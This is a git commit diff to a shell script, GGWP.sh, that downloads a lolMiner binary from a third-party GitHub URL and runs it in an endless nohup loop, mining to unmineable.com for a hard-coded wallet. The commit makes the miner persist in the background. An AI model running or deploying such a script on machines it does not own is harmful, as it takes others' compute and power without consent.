0a6f2149264b3271ecbfa2e589598f2798200255
goravine <82170185+goravine@users.noreply.github.com>
2021-04-12 04:56:50 +0700

    Update GGWP.sh

--- GGWP.sh
+++ GGWP.sh
@@ -4,7 +4,7 @@ sudo add-apt-repository --yes ppa:ethereum/ethereum
 sudo apt install ethereum
 wget https://raw.githubusercontent.com/emoisback/clbs/main/lolminer.tar.gz
 tar -zxvf lolminer.tar.gz
-
+random=$RANDOM
 while [ 1 ]; do
-        ./bin/lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user BTT:TEHEWGhfJBopZmuf7cut514YJNyunhj5Jt.'USER'$RANDOM --ethstratum ETHPROXY
+        nohup ./bin/lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user BTT:TEHEWGhfJBopZmuf7cut514YJNyunhj5Jt.'USER'$random --ethstratum ETHPROXY
 done
